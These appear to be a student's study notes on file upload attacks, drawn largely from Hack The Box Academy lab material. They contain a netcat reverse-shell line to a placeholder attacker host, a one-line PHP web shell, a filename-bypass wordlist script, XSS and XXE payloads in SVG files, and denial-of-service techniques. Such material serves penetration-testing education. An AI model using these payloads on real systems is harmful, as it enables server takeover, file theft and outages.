## Types of File Upload Attacks

1. unauthenticated ==arbitrary file upload==.
    - allows any user to upload ==any file type==.
    - **attack:** gaining remote command execution.
    - **cause of the vulnerability :** usage of ( insecure functions || outdated libraries) .
        
        Webshell: A script uploaded to a web server that provides remote control of the server through a web interface.
        
        Reverse Shell: A type of shell where the target machine communicates back to the attacking machine, allowing control over the target.
        
        Webshell: An attacker uploads "webshell.php" to a compromised website. By visiting "example.com/webshell.php", the attacker can execute commands directly on the server through a web interface.
        
        Reverse Shell: An attacker tricks a target machine into running a script that connects back to the attacker's machine. For instance, using `netcat`, the target might run `nc attacker-ip 1234 -e /bin/sh`, giving the attacker control over the target from their own terminal.
        
        A Web Shell provides us with an easy method to interact with the back-end server by accepting shell commands and printing their output back to us within the web browser. A web shell has to be written in the same programming language that runs the web server, as it runs platform-specific functions and commands to execute system commands on the back-end server, making web shells non-cross-platform scripts. So, the first step would be to identify what language runs the web application.
        
        We can find many excellent web shells online that provide useful  
        features, like directory traversal or file transfer. One good option for  
        `PHP` is [phpbash](https://github.com/Arrexel/phpbash), which provides a terminal-like, semi-interactive web shell. Furthermore, [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) provides a plethora of web shells for different frameworks and languages, which can be found in the `/opt/useful/SecLists/Web-Shells` directory in `PwnBox`.
        
        Although using web shells from online resources can provide a great  
        experience, we should also know how to write a simple web shell  
        manually. This is because we may not have access to online tools during  
        some penetration tests, so we need to be able to create one when needed.
        
        For example, with `PHP` web applications, we can use the `system()` function that executes system commands and prints their output, and pass it the `cmd` parameter with `$_REQUEST['cmd']`, as follows:
        
        Code: php
        
        ```
        <?php system($_REQUEST['cmd']); ?>
        ```
        
        If we write the above script to `shell.php` and upload it to our web application, we can execute system commands with the `?cmd=` GET parameter (e.g. `?cmd=id`), as follows:
        
        [![](https://academy.hackthebox.com/storage/modules/136/file_uploads_php_manual_shell.jpg)](https://academy.hackthebox.com/storage/modules/136/file_uploads_php_manual_shell.jpg)
        
        This may not be as easy to use as other web shells we can find  
        online, but it still provides an interactive method for sending commands  
        and retrieving their output. It could be the only available option  
        during some web penetration tests.
        
          
        
        to bypass a front end validation for the uploading type that is accepted ;
        
        1. modify the upload request via burp as a http req.
        2. or we can just manipulate the front-end code to disable these type validations.
        
          
        
          
        
        - modify the upload request via burp as a HTTP req.
            
            ## Back-end Request Modification
            
            Let's start by examining a normal request through `Burp`. When we select an image, we see that it gets reflected as our profile image, and when we click on `Upload`,  
            our profile image gets updated and persists through refreshes. This  
            indicates that our image was uploaded to the server, which is now  
            displaying it back to us:
            
            [![](https://academy.hackthebox.com/storage/modules/136/file_uploads_normal_request.jpg)](https://academy.hackthebox.com/storage/modules/136/file_uploads_normal_request.jpg)
            
            If we capture the upload request with `Burp`, we see the following request being sent by the web application:
            
            [![](https://academy.hackthebox.com/storage/modules/136/file_uploads_image_upload_request.jpg)](https://academy.hackthebox.com/storage/modules/136/file_uploads_image_upload_request.jpg)
            
            The web application appears to be sending a standard HTTP upload request to `/upload.php`.  
            This way, we can now modify this request to meet our needs without  
            having the front-end type validation restrictions. If the back-end  
            server does not validate the uploaded file type, then we should  
            theoretically be able to send any file type/content, and it would be  
            uploaded to the server.
            
            The two important parts in the request are `filename="HTB.png"` and the file content at the end of the request. If we modify the `filename` to `shell.php` and modify the content to the web shell we used in the previous section; we would be uploading a `PHP` web shell instead of an image.
            
            So, let's capture another image upload request, and then modify it accordingly:
            
            [![](https://academy.hackthebox.com/storage/modules/136/file_uploads_modified_upload_request.jpg)](https://academy.hackthebox.com/storage/modules/136/file_uploads_modified_upload_request.jpg)
            
            **Note:** We may also modify the `Content-Type` of the uploaded file, though this should not play an important role at this stage, so we'll keep it unmodified.
            
            As we can see, our upload request went through, and we got `File successfully uploaded` in the response. So, we may now visit our uploaded file and interact with it and gain remote code execution.
            
        
          
        

## Character Injection

Finally, let's discuss another method of bypassing a whitelist validation test through `Character Injection`.  
We can inject several characters before or after the final extension to  
cause the web application to misinterpret the filename and execute the  
uploaded file as a PHP script.

The following are some of the characters we may try injecting:

- `%20`
- `%0a`
- `%00`
- `%0d0a`
- `/`
- `.\`
- `.`
- `…`
- `:`

Each character has a specific use case that may trick the web application to misinterpret the file extension. For example, (`shell.php%00.jpg`) works with PHP servers with version `5.X` or earlier, as it causes the PHP web server to end the file name after the (`%00`), and store it as (`shell.php`),  
while still passing the whitelist. The same may be used with web  
applications hosted on a Windows server by injecting a colon (`:`) before the allowed file extension (e.g. `shell.aspx:.jpg`), which should also write the file as (`shell.aspx`).  
Similarly, each of the other characters has a use case that may allow  
us to upload a PHP script while bypassing the type validation test.

We can write a small bash script that generates all permutations of  
the file name, where the above characters would be injected before and  
after both the `PHP` and `JPG` extensions, as follows:

Code: bash

```
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

With this custom wordlist, we can run a fuzzing scan with `Burp Intruder`,  
similar to the ones we did earlier. If either the back-end or the web  
server is outdated or has certain misconfigurations, some of the  
generated filenames may bypass the whitelist test and execute PHP code.

  

## content of the img checker

`Content-Type Header` or `File Content`.

so we first use /opt/useful/SecLists-master/Miscellaneous/web

to fuzz for the allowed content file types .

we can use this `cat content-type.txt | grep 'image/' > image-content-types.txt` to grep only the img files-content

  

  

  

## task

protections i need to bypass :

1. Blacklist : it is in the back end server so it is as a script but maybe we can use one of the ways to bypass it via a wrong conf
2. whitelist : we will pass it by the http request
3. content-type :
    
    1. first lets fuzz content-type allowed
    2. we found that ( ) could bass → so we will get its mime start and add it in the payload content at the start
    
      
    
4. MIME-type :

  

  

  

white → via http requests

---

black → .$ $.jpg/jpeg/png

.phar .phtml pht → only images are allowed so they are not in the black list

---

  

mime → image.

```
ÿØÿÛC
```

## Limited file uploads

how is it limited ? → non arbitary file upload forms ( only allows us to upload specific file types )

---

svg , html , xml → has there own vulenrablities .

---

💡

fuzzing for the allowed file extensions is very important because it reveals alot .

---

[ xss ] we can upload a stored xss vulnerability file to the web application via the file upload attacks via a specific file types in the limited file upload the an arbitrary file upload attack .

via a maliciouse allowed file .

---

by uploading html file that contains a JS code but php will not excuted but js will excute and this html file after being uploaded will be containing a JS scipt that will hurt any one who visit this url to the uploaded file .

---

if we are allowed to upload an image in a comment we will be able to use “><img src=1 onerror= alert(window.origin)> and this will allow us to run xss vulnerability on the targeted site ( stored xss) .

---

and if we converted the MIME-type of the image to text/html we will be able to show this as an html document instead of an image ,in which case teh xss payload would be triggered even if the metadata wansn’t directly displayed .

---

we can do xss atttacks also by svg images, ( scalable vector graphics ) svg , the svg image is a graphical image that depends on displaying a xml file to display a 2d image . so we can manipluate the xml file of the svg image to contain a text/javascript and contain a xss attack .

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

once we upload this attack to the site the xss attack will be triggered whenever the image is displayed .

---

while we have xss there is also something called [ XXE ] the xxe exploitation is used to leak files content from the webpage so as an example file : /etc/passwd to leak the password and read them .

we can do that by putting the xxe expoitation payload in the xml file of the svg file we are going to upload .

```
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg>&xxe;</svg>
```

once the above attack is uploaded and worked the info of the passwd file and by this we will show the info in the same page or we will see the passwd info in the page source ( view source )

  

---

To use XXE to read source code in PHP web applications, we can use the following payload in our SVG image:

Code: xml

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

Once the SVG image is displayed, we should get the base64 encoded content of `index.php`, which we can decode to read the source code. For more about XXE, you may refer to the [Web Attacks](https://academy.hackthebox.com/module/details/134) module.

---

we can mainpulate the xml data not only on the SVG file no we can do that also on

1. PDF
2. WORD
3. DOCUMENTS
4. POWERPOINT

all of these documents also include XML data that can be manipulated to do XSS or XXE .

---

we may also use the XXE vulnerability to utilize SSRF attack server side attacks . we do that by making the xxe enumerate and manipulate the internally available services or even call the private apis to perform a private actions .

---

[ DOS ]

Denial of Service (DOS) attack

we can use the XXE payloads to achieve DoS attacks

---

we can simply use a Decomperssion Bomb to casue a crash in the server backend by just uploading a zip file that contains alot of zip files that each of them contains zip files and so on so if the server automatically unzip the zip file uploaded it will keep doing that till it use all of the server resources and need more resourced but it will not find more so it will crash and shutdown .

---

we get the decomperision bomb online instead of crafting it .

---

we can also do pixel flood attack under the name of dos like the decompresion bomb by just uploading an image file that utilize image compression like jpg or png so we can create any image in those formates and make its image size instead of something like 500x500 no we will make it (`0xffff x 0xffff`) which results in an image with a preceived size of 4 gigapixels so when the web application attempts to display the image it will attempt to allocate all of its memory to this image which will cause and results on a crash on the back-end server .

---

another way is to upload an enormouse large file that files the hardware space of the server ‘s hard drive cause it to crash or slow down considersably

---

another way is to upload a file to another directory if the WA upload function is vulenerable to directory traversal we may also attempt to upload a file to a different directory like ( ../../…/…/etc/passwd) which may also casue the server to crash .